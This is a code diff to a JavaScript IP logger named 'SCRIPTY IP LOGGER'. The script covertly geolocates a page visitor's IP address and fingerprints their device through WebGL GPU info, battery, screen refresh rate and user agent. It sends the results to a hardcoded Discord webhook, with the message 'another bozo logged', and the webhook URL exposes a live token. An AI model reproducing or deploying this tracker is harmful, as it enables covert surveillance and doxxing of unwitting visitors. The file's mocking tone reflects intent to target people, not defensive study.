@@ -6,7 +6,24 @@ const sendIP = () => {
 
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
-                .then(geoData => {
+                .then(async geoData => {
+
+                    // GPU detection via WebGL
+                    function getGPUInfo() {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                            if (!gl) return 'N/A';
+
+                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            if (debugInfo) {
+                                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                            }
+                            return 'N/A';
+                        } catch {
+                            return 'N/A';
+                        }
+                    }
 
                     const deviceInfo = {
                         userAgent: navigator.userAgent,
@@ -14,37 +31,40 @@ const sendIP = () => {
                         screenHeight: window.screen.height,
                         language: navigator.language,
                         platform: navigator.platform,
-                        battery: "N/A",
-                        charging: "N/A",
+                        battery: "PC don't have battery",
+                        charging: "PC don't have battery",
                         screenRefreshRate: "N/A",
                         touchScreen: ('ontouchstart' in window) ? 'Yes' : 'No',
-                        gpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " logical CPU cores" : "N/A"
+                        gpu: getGPUInfo()
                     };
 
                     if (navigator.getBattery) {
-                        navigator.getBattery().then(battery => {
+                        await navigator.getBattery().then(battery => {
                             deviceInfo.battery = (battery.level * 100).toFixed(0) + "%";
                             deviceInfo.charging = battery.charging ? "Yes" : "No";
                         });
                     }
 
                     const getScreenRefreshRate = () => {
-                        let frames = 0;
-                        const start = performance.now();
+                        return new Promise(resolve => {
+                            let frames = 0;
+                            const start = performance.now();
 
-                        const loop = () => {
-                            frames++;
-                            const elapsed = performance.now() - start;
-                            if (elapsed < 1000) {
-                                requestAnimationFrame(loop);
-                            } else {
-                                deviceInfo.screenRefreshRate = Math.round((frames * 1000) / elapsed) + " Hz";
-                            }
-                        };
+                            const loop = () => {
+                                frames++;
+                                const elapsed = performance.now() - start;
+                                if (elapsed < 1000) {
+                                    requestAnimationFrame(loop);
+                                } else {
+                                    resolve(Math.round((frames * 1000) / elapsed) + " Hz");
+                                }
+                            };
 
-                        requestAnimationFrame(loop);
+                            requestAnimationFrame(loop);
+                        });
                     };
-                    getScreenRefreshRate();
+
+                    deviceInfo.screenRefreshRate = await getScreenRefreshRate();
 
                     const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';
 
@@ -54,34 +74,35 @@ const sendIP = () => {
                         body: JSON.stringify({
                             username: "SCRIPTY IP LOGGER",
                             avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png",
-                            content: `@here another bozo clicked`,
+                            content: `@here another bozo logged`,
                             embeds: [{
                                 title: 'SCRIPTY IP LOGGER',
                                 description: `
 **IP Info:**
-IP Address >> ${ipadd}
-Network >> ${geoData.network}
-City >> ${geoData.city}
-Region >> ${geoData.region}
-Country >> ${geoData.country_name}
-Postal Code >> ${geoData.postal}
-Latitude >> ${geoData.latitude}
-Longitude >> ${geoData.longitude}
-Timezone >> ${geoData.timezone}
-ASN >> ${geoData.asn}
-Organization >> ${geoData.org}
+IP Address > ${ipadd}
+Network > ${geoData.network}
+City > ${geoData.city}
+Region > ${geoData.region}
+Country > ${geoData.country_name}
+Postal Code > ${geoData.postal}
+Latitude > ${geoData.latitude}
+Longitude > ${geoData.longitude}
+Timezone > ${geoData.timezone}
+Organization > ${geoData.org}
+
+**Screen Info:**
+Screen Width > ${deviceInfo.screenWidth}px
+Screen Height > ${deviceInfo.screenHeight}px
+Screen Refresh Rate > ${deviceInfo.screenRefreshRate}
+Touch Screen > ${deviceInfo.touchScreen}
 
 **Device Info:**
-User-Agent >> ${deviceInfo.userAgent}
-Screen Width >> ${deviceInfo.screenWidth}px
-Screen Height >> ${deviceInfo.screenHeight}px
-Language >> ${deviceInfo.language}
-Platform >> ${deviceInfo.platform}
-Battery >> ${deviceInfo.battery}
-Charging >> ${deviceInfo.charging}
-Screen Refresh Rate >> ${deviceInfo.screenRefreshRate}
-Touch Screen >> ${deviceInfo.touchScreen}
-GPU >> ${deviceInfo.gpu}
+User-Agent > ${deviceInfo.userAgent}
+Language > ${deviceInfo.language}
+Platform > ${deviceInfo.platform}
+Battery > ${deviceInfo.battery}
+Charging > ${deviceInfo.charging}
+GPU > ${deviceInfo.gpu}
                                 `,
                                 color: 1752220
                             }]
